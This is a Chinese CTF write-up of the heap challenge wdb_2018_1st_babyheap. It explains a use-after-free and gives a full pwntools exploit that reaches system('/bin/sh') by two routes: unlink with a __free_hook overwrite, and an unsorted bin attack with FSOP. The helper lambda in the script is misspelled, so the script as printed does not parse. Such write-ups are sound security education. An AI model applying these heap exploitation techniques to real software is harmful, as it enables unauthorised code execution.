# wdb_2018_1st_babyheap



### 总结

根据本题，学习与收获有：

- 一般来说，在`libc-2.23.so`中，能用`unlink`的题目，基本可以用`unsorted bin attack + IO_FILE`劫持`IO_jump_t`结构执行`system("/bin/sh")`。不用能`unlink`的题目，但是能溢出修改`unsorted bin chunk`的`size`并布局`unsorted bin chunk`内容，都可以用这一招偷鸡。
- 修改`unsorted bin`的`size`为`0x61`， 然后从`unsorted bin chunk`的头部开始，布局如下：`[/bin/sh\x00, 0x61 0, _IO_list_all - 0x10, 0, 1, 0xa8 * "\x00", fake_vtable_addr]`，然后`fake_vtable`填的内容如下：`[0, 0, 0, system_addr]`。

<!-- more -->

### checksec

![image-20210611195849744](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210611195849744.png)

运行环境为`ubuntu 16.04`，`libc-2.23.so`。

### 题目分析

就是很常见的菜单题，有一个堆指针数组在`bss`段上，不过需要注意的有：

- `allocate`最多只能调用`10`次，但是`edit`能编辑到索引为`0x1f`的`chunk`的指针。
- 每次`allocate`和`edit`的固定大小为`0x20`，不能申请其他大小的`chunk`
- `edit`的次数是`3`次，

### 漏洞分析

![image-20210611200734989](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210611200734989.png)

很基础的`UAF`

### 利用思路

一般来说，`UAF`可以用来泄露地址。这里有两种利用思路，分别讲一下;

**利用`unlink`**：

- 利用`UAF`泄露出堆地址

- 利用`fastbin attack`，修改到某个`chunk`的`size`，更改为`0x91`，然后释放掉
- 利用`show`泄露出`libc`地址
- 利用`unlink`修改堆指针数组
- 修改`__free_hook`为`system`地址
- 释放带`/bin/sh`的块

**利用`unsorted bin attack + IO_FILE`**:

- 用同样的方法去泄露地址
  - 布局`IO_FILE`结构，这里的`IO_FILE`结构会散落到多处，关键是要找到`vtable`等重要的内存单元
- 修改`unsorted bin chunk`的`size`为`0x61`
- 调用`malloc`，触发`IO_flush_all_lock_up`，刷新所有流，执行`system("/bin/sh")`

利用流程如图所示：

![image-20210611202537901](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210611202537901.png)

### 最终EXP

```python
from pwn import *
int16 = lambda x : int(x, base=16)
LOG_ADDR = lamda: x, y: log.info("Addr: {} ===> {}".format(x, y))

sh = process("./wdb_2018_1st_babyheap")
cur_elf = sh.elf
libc = sh.elf.libc

context.arch="amd64"

initial_date = flat(0, 0x31, 0, 0x31)

def allocate(idx, data=initial_date):
    if len(data) != 0x20:
        if isinstance(data, str):
            data += "\n"
        else:
            data += b"\n"
    sh.sendlineafter("Choice:", "1")
    sh.sendlineafter("Index:", str(idx))
    sh.sendafter("Content:", data)
    sh.recvline()


def edit(idx, data):
    if len(data) != 0x20:
        if isinstance(data, str):
            data += "\n"
        else:
            data += b"\n"
    sh.sendlineafter("Choice:", "2")
    sh.sendlineafter("Index:", str(idx))
    sh.sendafter("Content:", data)
    sh.recvline()


def show(idx):
    sh.sendlineafter("Choice:", "3")
    sh.sendlineafter("Index:", str(idx))
    msg = sh.recvline()
    info("msg ===> {}".format(msg))
    return msg


def free(idx):
    sh.sendlineafter("Choice:", "4")
    sh.sendlineafter("Index:", str(idx))


def attack_unlink():
    allocate(0)
    allocate(1)
    allocate(2)
    allocate(3)
    allocate(4, "/bin/sh\x00")

    free(1)
    free(0)
    # leak heap addr
    msg = show(0)
    leak_heap_addr = u64(msg[:-1].ljust(8, b"\x00"))
    LOG_ADDR("leak_heap_addr", leak_heap_addr)
    # fast bin attack
    free(1)
    allocate(5, flat(leak_heap_addr - 0x20))
    allocate(6, "a")
    allocate(7, "a")
    target_addr = 0x602090
    allocate(8, flat(target_addr - 0x18, target_addr - 0x10, 0x20, 0x90))

    # edit 0 to set fake size
    edit(0, flat(0, "\x21"))
    # unlink
    free(1)

    # leak libc addr
    msg = show(8)
    leak_libc_addr = u64(msg[:-1].ljust(8, b"\x00"))
    LOG_ADDR("leak_libc_addr", leak_libc_addr)
    libc.address = leak_libc_addr - 0x3c4b20 - 88
    LOG_ADDR("libc_base_addr", libc.address)

    edit(6, p64(libc.sym['__free_hook'])[:-1])
    edit(3, flat(libc.sym['system']))

    free(4)

    sh.interactive()


def attack_fsop():
    allocate(0)
    allocate(1)
    allocate(2)
    allocate(3)
    allocate(4, "/bin/sh\x00")

    free(1)
    free(0)
    # leak heap addr
    msg = show(0)
    leak_heap_addr = u64(msg[:-1].ljust(8, b"\x00"))
    LOG_ADDR("leak_heap_addr", leak_heap_addr)

    edit(0, flat(leak_heap_addr - 0x10))
    allocate(5, "a")
    allocate(6, flat(0, 0x91))
    allocate(7, flat(0, leak_heap_addr - 0x20)) # prepare for vtable

    # leak libc addr
    free(1)

    msg = show(1)
    leak_libc_addr = u64(msg[:-1].ljust(8, b"\x00"))
    LOG_ADDR("leak_libc_addr", leak_libc_addr)
    libc.address = leak_libc_addr - 0x3c4b20 - 88
    LOG_ADDR("libc_base_addr", libc.address)

    # fsop
    edit(6, flat("/bin/sh\x00", 0x61, 0, libc.sym['_IO_list_all'] - 0x10))
    edit(0, flat(0, 0, 0, libc.sym['system']))

    sh.sendlineafter("Choice:", "1")
    sh.sendlineafter("Index:", str(8))

    sh.interactive()

attack_fsop()
```

远程打：

`unlink`:

![image-20210611203447336](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210611203447336.png)

`FSOP`:

![image-20210611202909228](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210611202909228.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)



---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2021-06-10-wdb_2018_1st_babyheap/  

